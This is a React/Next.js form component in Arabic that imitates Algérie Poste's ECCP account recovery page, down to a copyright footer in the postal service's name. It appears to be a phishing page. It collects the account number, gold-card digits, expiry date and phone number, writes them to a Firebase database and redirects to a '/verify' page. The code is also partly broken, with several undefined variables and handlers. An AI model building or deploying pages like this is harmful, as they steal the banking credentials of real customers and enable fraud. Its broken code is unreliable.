'use client';
import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import { Check } from 'lucide-react';
import Header from '@/components/header';
import { useAuth } from '@/lib/context';
import { useRouter } from 'next/router';
import { addDoc, collection } from 'firebase/firestore';
import { addData, db } from '@/lib/firebase';

interface FormData {
  accountNumber: string;
  cardLastFourDigits: string;
  expirationMonth: string;
  expirationYear: string;
  phoneNumber: string;
  email: string;
}

export default function ECCPForm() {
  const [formData, setFormData] = useState<FormData>({
    accountNumber: '',
    cardLastFourDigits: '',
    expirationMonth: '01',
    expirationYear: '2025',
    phoneNumber: '',
    email: '',
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState('');
  const router = useRouter();

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSelectChange = (name: string, value: string) => {
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setError('');

    try {
      addData(formData);
      setShowSuccess(true);
      setTimeout(() => {
        router.push('/verify');
      }, 2000);
    } catch (error) {
      console.error('Error submitting form:', error);
      setError('حدث خطأ أثناء تقديم النموذج. يرجى المحاولة مرة أخرى.');
    } finally {
      setIsSubmitting(false);
    }
  };
  return (
    <div className="min-h-screen bg-gray-50">
      <div className="max-w-md mx-auto p-6 space-y-8" dir="rtl">
        {/* Header */}
        <div className="bg-white rounded-lg p-6 shadow-sm">
          <div className="text-center mb-8">
            <p className="text-lg text-muted-foreground">
              فتح حساب ECCP أو إسترجاع كلمة السر
            </p>
          </div>

          <div className="mb-6 text-center">
            <p className="text-sm text-muted-foreground">عبر البطاقة الذهبية</p>
          </div>

          <p className="mb-4 text-sm">
            لديك البطاقة الذهبية وترغب في فتح حساب ECCP أو نسيت كلمة السر؟
            <br />
            الرجاء إكمال الاستمارة التالية:
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-medium">الحساب الجاري</label>
              <Input
                type="text"
                className="text-right"
                onChange={(e) => handleInputChange}
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium">
                آخر 4 أرقام البطاقة الذهبية
              </label>
              <div className="grid grid-cols-4 gap-2">
                {cardDigits.map((digit, index) => (
                  <Input
                    key={index}
                    id={`digit-${index}`}
                    type="text"
                    maxLength={4}
                    value={digit}
                    onChange={(e) => handleDigitChange(index, e.target.value)}
                    className="text-center"
                    placeholder={
                      index === 0 ? '6280' : index === 1 ? '70XX' : 'XXXX'
                    }
                  />
                ))}
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium">
                تاريخ انتهاء الصلاحية
              </label>
              <div className="grid grid-cols-2 gap-2">
                <Select defaultValue="01">
                  <SelectTrigger>
                    <SelectValue placeholder="يوم" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="01">01 - يناير</SelectItem>
                    {/* Add more months */}
                  </SelectContent>
                </Select>
                <Select defaultValue="2025">
                  <SelectTrigger>
                    <SelectValue placeholder="سنة" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="2025">2025</SelectItem>
                    {/* Add more years */}
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium">
                رقم الهاتف المرتبط بالبطاقة
              </label>
              <Input type="tel" className="text-right" />
            </div>

            <div className="h-20 bg-gray-100 rounded flex items-center justify-center">
              {showSuccess ? (
                <div className="flex items-center gap-2 text-green-600">
                  <Check className="w-5 h-5" />
                  <span>Success!</span>
                </div>
              ) : (
                <div className="text-sm text-muted-foreground">
                  Verification Component
                </div>
              )}
            </div>

            {isVerifying && (
              <div className="text-center text-red-500 text-sm">
                تعذر التحقق من اتصالك. اضغط هنا لمحاولة مرة أخرى
              </div>
            )}

            <Button
              type="submit"
              className="w-full bg-primary hover:bg-primary/90"
              disabled={isVerifying}
            >
              {isVerifying ? 'جاري التحقق...' : 'تصديق'}
            </Button>
          </form>
        </div>

        {/* Email Section */}
        <div className="bg-white rounded-lg p-6 shadow-sm space-y-4">
          <p className="text-sm text-center">
            عبر عنوان البريد الإلكتروني الخاص بك
          </p>
          <p className="text-sm text-center">
            إذا أضفت بريدًا إلكترونيًا إلى حساب ECCP الخاص بك ،
            <br />
            فسنرسل إليك بريدًا لإعادة تعيين كلمة السر
          </p>
          <form className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium">البريد الإلكتروني</label>
              <Input type="email" className="text-right" />
            </div>
            <Button
              type="submit"
              className="w-full bg-primary hover:bg-primary/90"
            >
              تصديق
            </Button>
          </form>
        </div>

        {/* Post Office Section */}
        <div className="bg-white rounded-lg p-6 shadow-sm space-y-4">
          <p className="text-sm text-center">في مكتب البريد</p>
          <p className="text-sm text-center">
            يمكنك الحصول على الرمز السري على مستوى أي مؤسسة
            <br />
            بريدية مقابل تقديم نسخة عن بطاقة التعريف الوطنية في طور
            <br />
            الصلاحية مصحوبة بالاستمارة أدناه
          </p>
          <div className="flex justify-center">
            <a
              href="#"
              className="flex items-center gap-2 text-primary hover:underline"
            >
              <svg
                className="w-5 h-5"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path d="M7 18H17V16H7V18Z" fill="currentColor" />
                <path d="M17 14H7V12H17V14Z" fill="currentColor" />
                <path d="M7 10H11V8H7V10Z" fill="currentColor" />
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M6 2C4.34315 2 3 3.34315 3 5V19C3 20.6569 4.34315 22 6 22H18C19.6569 22 21 20.6569 21 19V9C21 5.13401 17.866 2 14 2H6ZM6 4H13V9H19V19C19 19.5523 18.5523 20 18 20H6C5.44772 20 5 19.5523 5 19V5C5 4.44772 5.44772 4 6 4ZM15 4.10002C16.6113 4.4271 17.9413 5.52906 18.584 7H15V4.10002Z"
                  fill="currentColor"
                />
              </svg>
              تحميل نموذج
            </a>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center text-sm text-muted-foreground">
          حقوق التأليف والنشر © 2025 بريد الجزائر
        </div>
      </div>
    </div>
  );
}
